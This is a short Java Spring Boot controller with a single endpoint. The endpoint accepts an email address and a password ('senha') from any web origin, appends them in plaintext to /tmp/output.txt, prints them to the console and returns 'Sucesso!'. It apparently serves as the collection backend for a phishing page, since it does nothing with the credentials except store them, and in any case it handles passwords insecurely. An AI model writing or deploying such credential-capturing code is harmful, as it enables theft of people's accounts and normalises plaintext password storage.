package com.example.demo.controller;

import com.example.demo.model.Email;
import lombok.AllArgsConstructor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.HttpStatusCode;
import org.springframework.http.ResponseEntity;
import org.springframework.util.ResourceUtils;
import org.springframework.web.bind.annotation.*;

import javax.mail.Authenticator;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Store;
import java.io.*;
import java.nio.file.Files;
import java.util.Properties;

@RestController
@RequestMapping("/api/v1/file")
@CrossOrigin(origins = "*")
@AllArgsConstructor(onConstructor = @__(@Autowired))
public class FilesController {

    @PostMapping(value = "/email")
    public ResponseEntity<String> postEmail(@RequestBody Email email){
        File file = null;
        try {
            file = ResourceUtils.getFile("/tmp/output.txt");
            String content = new String(Files.readAllBytes(file.toPath()));

            try (Writer writer = new BufferedWriter(new FileWriter(file))) {
                String newLine = System.getProperty("line.separator");
                String contents =  content + newLine + email.getEmail() + "|" + email.getSenha();

                writer.write(contents);
                System.out.println(contents);
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return new ResponseEntity<>(new String("Sucesso!"), HttpStatus.OK);
    }
}
